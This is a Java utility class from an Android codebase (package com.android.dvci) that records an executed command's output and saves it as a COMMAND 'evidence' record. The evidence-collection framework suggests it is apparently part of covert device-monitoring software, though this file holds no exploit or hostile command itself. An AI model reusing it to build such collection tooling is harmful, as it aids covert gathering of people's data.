package com.android.dvci.util;

import java.util.ArrayList;

import com.android.dvci.auto.Cfg;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.evidence.EvidenceType;
import com.android.dvci.file.Directory;

public class ExecuteResult {
	private static final String TAG = "ExecuteResult";

	public int exitCode = 0;
	public ArrayList<String> stdout = new ArrayList<String>();
	public ArrayList<String> stderr = new ArrayList<String>();
	public final String executionLine;

	public ExecuteResult(String cmd) {
		executionLine = Directory.expandMacro(cmd);
	}

	public String getStdout() {
		return listToString(stdout);
	}

	public String getStdErr() {
		return listToString(stderr);
	}

	private String listToString(ArrayList<String> list) {
		StringBuilder fullRet = new StringBuilder();

		for (String string : list) {
			fullRet.append(string);
			fullRet.append("\n");
		}

		return fullRet.toString();
	}

	public void saveEvidence() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (parseExecute) Output:" + getStdout());
		}

		byte[] content = WChar.getBytes(getStdout(), true);
		final byte[] additional = WChar.pascalize(executionLine);
		
		if (Cfg.DEBUG) {
			Check.log(TAG + " (saveEvidence), content: " + content.length);
			Check.log(TAG + " (saveEvidence), additional: " + additional.length);
		}

		EvidenceBuilder.atomic(EvidenceType.COMMAND, additional, content);
		if (Cfg.DEBUG) {
			Check.log(TAG + " (saveEvidence), end");
		}
	}
}
